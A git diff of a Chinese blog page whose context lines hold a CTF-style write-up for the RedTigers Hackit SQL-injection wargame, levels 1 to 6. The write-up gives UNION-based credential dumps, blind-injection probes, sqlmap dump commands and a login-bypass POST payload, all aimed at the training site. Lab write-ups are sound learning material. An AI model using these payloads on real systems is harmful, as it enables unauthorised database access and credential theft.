@@ -92,13 +92,13 @@
 <meta property="og:url" content="http://ug1y.github.io/2016/10/04/RedTigers-Hackit通关笔记/index.html">
 <meta property="og:site_name" content="ugly's Notes">
 <meta property="og:description" content="前言RedTigers Hackit是一个训练SQL注入漏洞和PHP方面的网站，地址为https://redtiger.labs.overthewire.org/，也是看各位做CTF比赛的人分享的一个学习网站，总共有10关，感觉学到不少。">
-<meta property="og:image" content="http://ug1y.github.io/images/red_20161004172950.png">
-<meta property="og:image" content="http://ug1y.github.io/images/red_20161004190358.png">
-<meta property="og:updated_time" content="2016-10-05T13:00:48.830Z">
+<meta property="og:image" content="http://ug1y.github.io/images/red_20161005210547.png">
+<meta property="og:image" content="http://ug1y.github.io/images/red_20161005210513.png">
+<meta property="og:updated_time" content="2016-10-05T13:07:00.423Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RedTigers Hackit通关笔记">
 <meta name="twitter:description" content="前言RedTigers Hackit是一个训练SQL注入漏洞和PHP方面的网站，地址为https://redtiger.labs.overthewire.org/，也是看各位做CTF比赛的人分享的一个学习网站，总共有10关，感觉学到不少。">
-<meta name="twitter:image" content="http://ug1y.github.io/images/red_20161004172950.png">
+<meta name="twitter:image" content="http://ug1y.github.io/images/red_20161005210547.png">
 
 
 
@@ -361,7 +361,7 @@
 
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RedTigers Hackit是一个训练SQL注入漏洞和PHP方面的网站，地址为<a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="external">https://redtiger.labs.overthewire.org/</a>，也是看各位做CTF比赛的人分享的一个学习网站，总共有10关，感觉学到不少。</p>
-<p><img src="/images/red_20161004172950.png" alt=""></p>
+<p><img src="/images/red_20161005210547.png" alt=""></p>
 <a id="more"></a> 
 <h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>既然是简单的sql注入，那我们就按照正常流程去试试，试验知道cat参数是纯粹的数字输入，没有用引号包裹，构造<code>?cat=1 or 1</code>，能够正常输出。猜测select语句的列数<code>?cat=1 order by 4</code>得到输出4列，用联合查询得到产生输出的位置，最后构造查询语句从level1_users数据库中得到结果。注入语句构造如下：<br><strong><code>https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users</code></strong></p>
 <p>ps：这里直接from数据库就可以，发现可以用<code>where 1</code>获得结果，然而<code>where username=&quot;Hornoxe&quot;</code>无法正确输出，猜测可能对引号禁用。</p>
@@ -373,7 +373,7 @@
 <h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><p>这一关看样子是盲注了，页面输出<code>Query returned 1 rows.</code>消息来告知注入是否是正确返回查询的。首先判断注入点的注入方式，<code>?id=1 or 1</code>成功返回1行，即注入成功。<code>?id=1 order by 2</code>得到select语句总共输出两列。接下来的就是用<code>length()、substr()、ascii()</code>等函数对数据表的<code>keyword</code>列的内容进行猜测了。如下构造得知列内容长度为21：<br><strong><code>https://redtiger.labs.overthewire.org/level4.php?id=-1 or (select length(keyword) from level4_secret)&gt;20</code></strong></p>
 <p>另外，对每一个字符进行猜测可得到所有字符，猜测到第一个字符ascii码为107，即字符<code>k</code>：<br><strong><code>https://redtiger.labs.overthewire.org/level4.php?id=-1 or (select ascii(substr(keyword,1,1)) from level4_secret)&gt;106</code></strong></p>
 <p>可以写一个脚本来跑一遍得到最终结果，我比较懒，用sqlmap自动去跑好了，首先检测注入点：<br><strong><code>python sqlmap.py -u &quot;https://redtiger.labs.overthewire.org/level4.php?id=1&quot; --cookie &quot;level4login=there_is_no_bug&quot; --dbms mysql --batch</code></strong><br>接下来获取指定数据库中表的指定列内容，需要耐心等待：<br><strong><code>python sqlmap.py -u &quot;https://redtiger.labs.overthewire.org/level4.php?id=1&quot; --cookie &quot;level4login=there_is_no_bug&quot; --dbms mysql -D hackit -T level4_secret -C keyword --dump</code></strong></p>
-<p><img src="/images/red_20161004190358.png" alt=""></p>
+<p><img src="/images/red_20161005210513.png" alt=""></p>
 <h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><p>题目提示是绕过登录，密码是MD5加密过的。表单username参数输入<code>\</code>输出错误，于是同样找到构造<code>a&#39; or 1#</code>来注入。首先获得select查询的列数<code>a&#39; order by 2#</code>得知列数为2，构造联合查询<code>a&#39; union select 1,2#</code>，其中两列一个是查询的username，另一个是md5加密过的password，查询语句获取相应的用户名和密码，然后查找是否有匹配的项，于是我们可以构造一对有效的组合，用户名为<code>1</code>，密码为<code>2</code>，于是密码的MD5值为<code>c81e728d9d4c2f636f067f89cc14862c</code>。</p>
 <p>将密码的MD5值插到查询中，对应的值作为POST参数传递过去，匹配上则登录绕过成功，最终的构造为：<br>Post data：<strong><code>username=a&#39; union select 1,&#39;c81e728d9d4c2f636f067f89cc14862c&#39;#&amp;password=2&amp;login=Login</code></strong></p>
 <h1 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h1><p>首先检测注入点是否需要引号括号之类闭包，得到<code>?user=1 or 1--+</code>可以注入。获取查询语句的列数<code>?user=1 order by 5--+</code>为5列，构造联合查询发现显示<code>User not found</code>，并没有显示对应的输出行，构造<code>?user=0 union select 1,2,3,4,5 from level6_users where status=1--+</code>也是一样，这里就比较郁闷了。</p>
